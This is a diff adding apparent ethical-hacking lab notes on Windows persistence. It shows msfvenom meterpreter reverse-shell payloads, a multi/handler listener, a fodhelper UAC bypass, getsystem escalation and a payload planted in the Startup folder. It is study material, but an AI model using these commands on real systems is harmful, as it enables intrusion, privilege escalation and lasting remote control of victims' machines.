@@ -92,3 +92,71 @@ run vnc
 
   ```
 /details>
+
+<details>
+	<summary>Maintain persistence by abusing boot/logon autostart execution</summary>
+	
+	```console
+	[linux]
+	sudo su
+	cd 
+	msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=IP LPORT=444 > /home/attacker/Desktop/exploit.exe
+	cp /home/attacker/Desktop/exploit.ext /var/www/html/share/   [follow same steps to share folder - mentioned b4]
+	service apache2 start
+	msfconsole
+	use exploit/multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set lhost IP
+	set lport 444
+	run
+	
+	[windows]
+	http://PIP/share
+	
+	[linux]
+	meterpreter session will be opened
+	getuid
+
+	try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.
+	
+	background
+	use exploit/windows/local/bypassuac_fodhelper
+	set session 1
+	show options
+	set LHOST IP
+	set TARGET 0  [0 - Exploit Target ID]
+	exploit
+
+	The BypassUAC exploit has successfully bypassed the UAC setting on the **Windows 11** machine.
+	
+	getsystem -t 1  -> to elevate privileges
+	getuid 
+	cd “C:\\ProgramData\\Start Menu\\Programs\\Startup”
+	pwd
+	create payload that needs to be uploaded into the Startup folder of Windows 11 machine.
+	
+	Second terminal->
+	msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=8080 -f exe > payload.exe
+	
+	First Terminal
+	upload /home/attacker/payload.exe 
+	
+	[windows]
+	Login to Admin account -> Restart windows machine
+	
+	[Linux]
+	Open another terminal window with root privilages 
+	msfconsole
+	use exploit/multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set lhost [IP]
+	set lport 8080
+	exploit
+	
+	[windows]  login to Admin account and restart the machine so that the malicious file that is placed in the startup folder is executed.
+	
+	[parrot]
+	meterpreter session is open [Note: takes little time to open]
+	getuid
+ 	
+</details>
